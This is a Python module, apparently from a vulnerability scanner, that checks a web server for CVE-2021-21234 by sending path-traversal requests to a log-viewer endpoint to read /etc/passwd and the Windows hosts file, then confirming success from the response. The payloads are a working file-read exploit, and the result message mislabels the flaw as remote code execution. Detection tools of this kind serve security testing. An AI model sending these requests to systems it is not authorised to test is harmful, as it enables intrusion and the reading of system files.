#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2021_21234.py
   Description :
   Author :       sule01u
   date：          2023/10/19
"""
import requests
from urllib.parse import urljoin
from utils.custom_headers import DEFAULT_HEADER, TIMEOUT
from colorama import Fore
from utils.logging_config import configure_logger
logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()


CVE_ID = "CVE-2021-21234"


def is_vulnerable(response_text, conditions):
    return all(condition in response_text for condition in conditions)


def check(url, dns_domain, proxies=None):
    """  
    对给定的目标URL检测CVE-2021-21234漏洞。

    参数:
    - target_url: 待检测的目标URL
    - proxies: 代理配置
    """
    PAYLOADS = [
        {
            "path": "manage/log/view?filename=/etc/passwd&base=../../../../../../../",
            "conditions": [r"root", r"nobody", r"daemon"]
        },
        {
            "path": "manage/log/view?filename=C:/Windows/System32/drivers/etc/hosts&base=../../../../../../../",
            "conditions": ["Microsoft Corp", "Microsoft TCP/IP for Windows"]
        },
        {
            "path": "manage/log/view?filename=C:\\Windows\\System32\\drivers\\etc\\hosts&base=../../../../../../../",
            "conditions": ["Microsoft Corp", "Microsoft TCP/IP for Windows"]
        }
    ]
    for payload in PAYLOADS:
        target_url = urljoin(url, payload["path"])
        try:
            res = requests.get(target_url, headers=DEFAULT_HEADER, timeout=TIMEOUT, verify=False, proxies=proxies)
            logger.debug(Fore.CYAN + f"[{res.status_code}]" + Fore.BLUE + f"[{res.headers}]", extra={"target": target_url})
            if res.status_code == 200 and is_vulnerable(res.text, payload["conditions"]):
                logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
                return True, {
                    "CVE_ID": CVE_ID,
                    "URL": target_url,
                    "Details": f"检测到{CVE_ID}的RCE漏洞",
                    "response": res.text[:200] + "...."
                }
        except requests.RequestException as e:
            logger.debug(f"[Request Error：{e}]", extra={"target": target_url})
            return False, {}
        except Exception as e:
            logger.error(f"[Unknown Error：{e}]", extra={"target": target_url})
            return False, {}
    logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
    return False, {}


if __name__ == '__main__':
    is_vul, res = check("http://localhost:8080/", "", proxies={})
    print(is_vul, res)
